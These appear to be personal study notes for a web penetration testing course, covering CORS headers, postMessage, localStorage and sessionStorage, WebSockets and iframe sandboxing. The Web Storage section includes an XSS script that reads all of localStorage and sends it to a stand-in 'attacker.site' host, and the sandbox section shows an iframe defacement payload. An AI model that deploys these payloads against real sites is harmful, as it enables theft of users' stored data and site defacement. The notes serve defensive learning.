# Cross Origin Resource Sharing (CORS)
- same origin policy (SOP) : is a policy implemented by browsers to prevent interactions between resources of different origin.
- CSS stylesheets, images and scripts are loaded without checking the SOP
- Browsers check the SOP when performing AJAX requests
- Within the Flash security model, a method to bypass the same origin policy has already been developed
  - An SWF animation on the origin a.com can access via Actionscript resources such as images and audio files on a different origin, b.com. This can happen only if the crossdomain.xml file allows this operation.
- `CORS` : It enables client-side cross-origin requests. by HTTP Header Called `Control Access Headers
- The CORS standard is used to enable cross-origin HTTP requests for
  - Ajax requests (through the XMLHttpRequest API)
  - Web Fonts (for cross-domain font inclusion via @font-face within a CSS)
  - WebGL textures
  - Images drawn using the drawImage API
- CORS is supported by all Browsers except Opera mini
- Cross Origin Ajax Request : `http://origina.ori/index.html`
```
function crossOriginXHRGet(){
var xmlhttpr = new XMLHttpRequest();
var url = 'http://originb.ori/page.html';
 xmlhttpr.open('GET', url, true);
 xmlhttpr.onreadystatechange = handler;
 xmlhttpr.send(body); 
}
```
- this request is cross origin because the requester (http://origina.ori/index.html) is different from the target (http://originb.ori/page.html)
- so the function cannot use js to read the page contents according to SOP
- this kind of access is allowed if HTTP CORS are used and set properly
- HTTP CORS Headers  Request type
  - Simple requests
  - Preflight request
  - Request with credentials
- Simple Request
  - It only uses GET, HEAD or POST HTTP methods,If the request method is POST, the Content-Type HTTP header must be one of the following
    - application/x-www-form-urlencoded
    - multipart/form-data
    - text/plain
- Preflight request : when it is not a Simple request
  - A PUT request
  - A POST request with Content-type set to application/xml
  - A GET request with a custom header such as X-PINGOTHER
  - need to send two HTTP requests : The first request is an HTTP OPTIONS
  - browser and web server use http origin header to negotiate permessions
  - HTTP Origin : called control access headers
  - By the use of the HTTP response header Access-Control-Max-Age, the browser will cache the result of the OPTIONS request to avoid sending alot of http request for subsequent request 
  - Example
  ```
  var xmlhttpr = new XMLHttpRequest();
	var url = 'http:// originb.ori/file.html';
	function handler(){
	. . . . 
	}
	function deleteResource(){
	 xmlhttpr.open('DELETE', url, true);
	 xmlhttpr.setRequestHeader('Front-End-Https', on');
	 xmlhttpr.onreadystatechange = handler;
	 xmlhttpr.send(body); 
	}
  ```
  - it will send non standered HTTP request (Front-End-Https) so it must be handeled as Preflight request
  - Brwoser will send two different HTTP Request
  ```
  Origin: http://origina.ori 
	Access-Control-Request-Method: DELETE
	Access-Control-Request-Headers: Front-End-Https
  ```
  - response will be checked by browser to make sure that the server allows the request type
  - Server Response will contain 200 and another response with the DELETE /File.html
  - because it boths allows The HTTP Verb and comes from authorized origin
  ```
  Access-Control-Allow-Origin: http://origina.ori
	Access-Control-Allow-Methods: POST, GET, OPTIONS, DELETE
	Access-Control-Allow-Headers: Front-End-Https
	Access-Control-Max-Age: 3600
  ```
- By Default broswers dont send credentials in cross origin ajax request
- HTTP Cookies and HTTP Authentication Info are considered Credentials
- if devolper decided to include cred he must set flag with credentials with XHR invocation
```
	<script type="text/javascript">
	function handler() {
	. . . 
	}
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "http://originb.com/home.html", true);
	xhr.withCredentials = true; ###################################
	xhr.onreadystatechange = handler;
	xhr.send();
	</script>
	
```
- Access control headers 
  - Access-Control-Allow Origin : `<domains>` or *  -->  access specific requester origin.
  - Access-Control-Allow-Credentials : True --> Request can be made with credentials
  - Access-Control-Allow-Headers
  - Access-Control-Allow-Methods
  - Access-Control-Max-Age 
  - Access-Control-Expose-Headers
  - Origin : contains (protocol, domain name and port)
  - Access-Control-Request-Method
  - Access-Control-Request-Headers
- Access-Control-Allow Origin
  - Most important Http response Header and is set by target origin to allow access from a specific requester origin
  - Format
  ```
  Access-Control-Allow Origin : <Allowed Origin>
  ```
- WildCard that permit external scripts hosted on any site to access resources from the target origin
 ```
 Access-Control-Allow Origin : *
 ```
- Access-Control-Allow-Credentials
  - indicates that actual request will be made with creds
  - By Default broswers dont send credentials in cross origin ajax request
  - must set withcreds flag to true if needed to send creds
- For security reasons will never be sent together : 
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```
- Access-Control-Allow-Headers
  - sent by the target origin to the requester  during preflight requests
  - it indicates which non-standerd http headers can be sent in the actual request
- Access-Control-Allow-Methods
  - sent by the target origin to the requester  during preflight requests
  - it indicates which http methods can be used during the actual request
- Access-Control-Max-Age
  - sent by the target origin to the requester  during preflight requests
  - it indicates how long the result of preflight requests can be chached
- Access-Control-Expose-Headers
  - sent by the target origin to the requester
  - indicates which headers can be accessed by the browser
- Header Origin
  - contains (protocol, domain name and port)
  - always sent but useless in authorization protocol
- Access-Control-Request-Method
  - sent by the target origin to the requester  during preflight requests
  - sent within OPTIONS request
  - specifies what method the requester is going to use during the actual request
  - it will analyze Access-Control-Allow-methods to check whether methods sent are considered safe by the web server  or not
- Access-Control-Request-Headers
  - sent by the target origin to the requester  during preflight requests
  - sent within OPTIONS request
  - specifies which non-standerd http headers the requester is going to use in the actual request
  - if broswer send request containing
  ```
  Access-Control-Request-Headers : X-PINGOTHER
  ```
  - it will analyze Access-Control-Allow-Headers to check whether headers sent are considered safe by the web server  or not
# Cross Windows Messaging
- HTML5 allows iframes, frames, popups to communicate one with each other regardless of SOP by using Cross Windows Messaging
- Relationships between Windows
	1. A main window including an iframe
	2. A main window including some HTML code that generates a popup
- A window or a tab in a browser cannot interact with other window unless they have a relationship
- A window can send messages to another window by using the postMessage API call.
- The following code accepts messages from every source!
```
<script>
window.addEventListener("message", receiveMessage, false);
function receiveMessage(event) {
	console.log("Message received")
 	// Do some actions
	// . . . 
}
</script>
```
- if message is used to build the page output The attacker has just to exploit an XSS vulnerability in the source domain and build some JavaScript code to send a malicious message.

# Web Storage 
- HTML5 allows websites to store data locally in the browser.
- This is done by accessing the localStorage and the sessionStorage objects via JavaScript.
- Mistakenly lead us to associate this type of storage with cookies.
- Differences
  - `Size`: **cookie** size is limited to 4KB, while **localStorage** size ranges from 5MB to 10MB (depending on the browser implementation)
  - `Interface`: **cookies** are accessed by client/server and transferred over HTTP connections **localStorage** is known only to the browser
  - `Data model`: **cookies** represent a complex structure, while **web storage** provides a simpler interface by using an associative array data model.
- HTML5 distinguishes two different storage models: local storage and session storage
  - Session storage is less persistent than local storage.
- local storage
  - persistant javascript object used as local repository
  - HTML pages loaded by the browser and sharing the same origin will use the same local storage object
  - This storage is persistent and will be deleted when one of the following events occur :
    - The web application deletes storage through localStorage API calls
    - The user deletes storage using the browser cleaning feature, For example through the Clear Recent History feature
  - Local Storage API
    - You can add an item to the localStorage
    - `localStorage.setItem('username','jsmith');` 
    - To retrieve an item from the localStorage
    - `var usrname = localStorage.getItem('username'); console.log(usrname);` 
    - Remove an item from the localStorage
    - `localStorage.removeItem('username'); console.log(localStorage.getItem('username'));`
    - clear the localStorage
    - `localStorage.clear()`
- Session storage
  - is bound to the browser window where a website is open.
  - If a browser has ten tabs pointing to the same URL: each of them will have its own sessionStorage
  - This storage is deleted when one of the following events occurs :
    -  The web application deletes storage through sessionStorage API calls
    -  The user deletes storage through the browser cleaning feature
    -  The user closes the browser window
  -  Note that when a user refreshes the browser page, the sessionStorage object is kept
  -  Session Storage API
    -  setItem
    -  getItem
    -  removeItem
    -  Clear
- both localStorage and sessionStorage are managed via JavaScript, they can be stolen through XSS attacks.
- This script cycles through the storage and then submits it to an attacker controlled site:
```
<script>
var i = 0;
var stor = "";
var img = new Image();
while (localStorage.key(i) != null)
{
 var key = localStorage.key(i); 
 stor += key + ": " + localStorage.getItem(key)) + "\n";
 i++;
}
img.src="http://attacker.site?steal.php?storage=" + stor;
</script>
```
# WebSockets
- the web socket is introduced to meet real time web app needs
- The WebSocket protocol features:
	1. Connection established by upgrading an existing HTTP connection to WebSocket
	2. Supported by browsers --> ws://, wss:// "secure"
	3. HTTP standard ports 80,443, This means: no firewall issues for the users
	4. Full-duplex-->The protocol allow communication in both directions simultaneously
- Through websockets real time web apps can take advanteges of
  - minimal packet overhead
  - no pooling overhead
  - real TCP allow low latency
- To connect to a WebSocket server : 
    `var ws = new WebSocket('ws://<WebSocketServerURL>');`
- To receive notifications about the opened connection use the onopen event listener:
```
ws.onopen = function(e) {
alert("Connection established");
// send a message
this.send('<your message>');
}
```
- To receive notifications about new messages use the onmessage event listener:
```
ws.onmessage = function(e) {
alert("Received message");
// read the message
var msg= e.data;
alert(msg);
}
```
- If developers do not sanitize lead to XSS, localStorage stealing, SQL injections and more

# Sandboxed frames
- A classic issue occurs when a website hosts third-party contents through iframes.
- the location proberty of each document is always writable despite SOP
- `location` is an exception to the SOP
- An iframe could redirect visitors to an arbitrary website by simply setting the location property of its parent document.
- Example : If a web page (index.html) includes an attacker controlled page (evil.html) in an iframe, the attacker can change the window.location and redirect users to an attacker controlled site (http://attacker.site/).
- The previous attack is possible because:
  - The target website hosts the attackers iframe
  - The target website does not prevent an attacker from changing the location property
- Preventing
  - Old School
    - Installing a special event (onbeforeunload) in the main document hosting the iframes.
    -by using this technique the main document will inform the visitor the the page is being changed
![odlschool](https://github.com/Islamkafafy123/EWAPT/blob/main/pictures/oldsc.jpeg)
- If the main document and the iframe are located on the same origin, they can access each other.
  - the iframe can change the contents of the main documents using the same techniques used the defacment by via xss attack family 
`<script> window.parent.document.body.innerHTML = 'defaced'; </script>`
- For example in a scenario where: 
  - the attacker succeeds in exploiting a persistent XSS in the vulnerable.html page
  - the vulnerable.html page is included through an iframe into the index.hmtl page
- The attacker first exploit a persistant XSS then the malicous cod eis run inside the index.html thus runing the defacment code
- ![defac](https://github.com/Islamkafafy123/EWAPT/blob/main/pictures/defac.jpeg)
- To understand the attack, consider that:
  - The index.html page includes the page vulnerable.html through an iframe.
  - The JavaScript code on the iframe can access the parent document (index.html) because of the same origin policy therefore, the iframe can change the main document’s contents.
  - the victim open the index.html and sees website defaced
- The `sandbox` attribute is a new attribute of the element iframe . It has been introduced by the HTML5 specs, and enables restrictions on iframe contents.
![sandb](https://github.com/Islamkafafy123/EWAPT/blob/main/pictures/sandb.jpeg)
- By default, the sandbox attribute denies all
  - ALLOW-SCRIPT : This flag allows script execution
  - ALLOW-FORMS : This flag allows form submission
  - ALLOW-TOP-NAVIGATION : This flag allows the iframe content to navigate its top-level browsing context.
